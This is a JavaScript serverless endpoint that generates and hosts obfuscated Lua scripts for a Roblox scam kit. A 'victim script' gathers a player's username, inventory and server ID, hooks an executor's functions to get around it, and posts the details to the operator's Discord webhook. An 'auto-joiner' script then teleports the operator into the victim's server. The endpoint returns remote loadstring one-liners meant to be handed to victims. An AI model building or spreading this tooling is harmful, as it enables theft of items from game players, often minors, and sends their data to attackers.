    export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
    
    const { webhook, gameId, receiverName } = req.body;
    
    if (!webhook || !webhook.includes('discord.com/api/webhooks/')) {
        return res.status(400).json({ error: 'Invalid webhook' });
    }
    
    try {
        // Generate both scripts
        const victimScript = generateVictimScript(webhook, gameId, receiverName);
        const joinerScript = generateJoinerScript(webhook, gameId);
        
        // Upload victim script to Pastefy
        const victimRes = await fetch('https://pastefy.app/api/v2/paste', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: simpleObfuscate(victimScript),
                title: `VictimScript_${Date.now()}`,
                visibility: 'UNLISTED'
            })
        });
        
        // Upload joiner script to Pastefy
        const joinerRes = await fetch('https://pastefy.app/api/v2/paste', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: simpleObfuscate(joinerScript),
                title: `JoinerScript_${Date.now()}`,
                visibility: 'UNLISTED'
            })
        });
        
        const victimData = await victimRes.json();
        const joinerData = await joinerRes.json();
        
        const victimId = victimData.id || victimData.paste?.id;
        const joinerId = joinerData.id || joinerData.paste?.id;
        
        return res.status(200).json({
            success: true,
            victimLoadstring: `loadstring(game:HttpGet("https://pastefy.app/${victimId}/raw"))()`,
            joinerLoadstring: `loadstring(game:HttpGet("https://pastefy.app/${joinerId}/raw"))()`
        });
        
    } catch (error) {
        return res.status(500).json({ success: false, error: error.message });
    }
}

function generateVictimScript(webhook, gameId, receiverName) {
    return `-- VICTIM SCRIPT - Run this on the victim
local webhook = "${webhook}"
local receiver = "${receiverName}"
local targetGame = ${gameId}

local request = syn and syn.request or request or (http and http.request)
if not request then return end

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local lp = Players.LocalPlayer

-- Delta bypass
local realJobId = game.JobId
if identifyexecutor and identifyexecutor() == "Delta" then
    for _, v in ipairs(getgc(true)) do
        if typeof(v) == "function" and debug.getinfo(v) and debug.getinfo(v).name == "stepAnimate" then
            hookfunction(v, function(dt)
                realJobId = game.JobId
                return v(dt)
            end)
            break
        end
    end
    task.wait(0.5)
end

-- Get inventory
local items = {}
pcall(function()
    local profile = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes"):FindFirstChild("Inventory"):FindFirstChild("GetProfileData"):InvokeServer(lp.Name)
    if profile and profile.Weapons then
        for k, v in pairs(profile.Weapons.Owned) do
            table.insert(items, {name = k, amount = v})
        end
    end
end)

-- Send to Discord
local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', targetGame, realJobId)
local data = {
    content = "@everyone\\n**NEW VICTIM!**\\n```lua\\n" .. joinScript .. "\\n```",
    embeds = {{
        title = "🎯 Victim Found",
        fields = {
            {name = "Username", value = lp.Name, inline = true},
            {name = "Items", value = #items > 0 and tostring(#items) .. " items" or "Unknown", inline = true},
            {name = "Server", value = realJobId, inline false}
        }
    }}
}
request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
print("Victim script executed! Server sent to webhook.")`;
}

function generateJoinerScript(webhook, gameId) {
    return `-- AUTO-JOINER SCRIPT - Run this on your executor
local targetGame = ${gameId}
local webhook = "${webhook}"

local request = syn and syn.request or request or (http and http.request)
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local lp = Players.LocalPlayer

-- Your webhook for receiving joins (same as victim webhook)
-- This script will auto-join any victim that gets posted

print("Auto-Joiner started! Waiting for victims...")

-- You'll get victim servers from your Discord webhook
-- The victims will send their server info there

-- Example: Manually set a target (or get from Discord)
local targetJobId = nil -- Will be set when victim posts

-- For automatic detection, you'd need a bot reading Discord
-- For now, you can manually copy the Job ID from Discord

while true do
    if targetJobId and targetJobId ~= "" and game.PlaceId ~= targetGame then
        print("Joining server: " .. targetJobId)
        pcall(function()
            TeleportService:TeleportToPlaceInstance(targetGame, targetJobId, lp)
        end)
        break
    end
    task.wait(2)
end`;
}

function simpleObfuscate(script) {
    let obf = script.replace(/--[^\n]*/g, '');
    obf = obf.replace(/\n\s*\n/g, '\n');
    return obf;
}
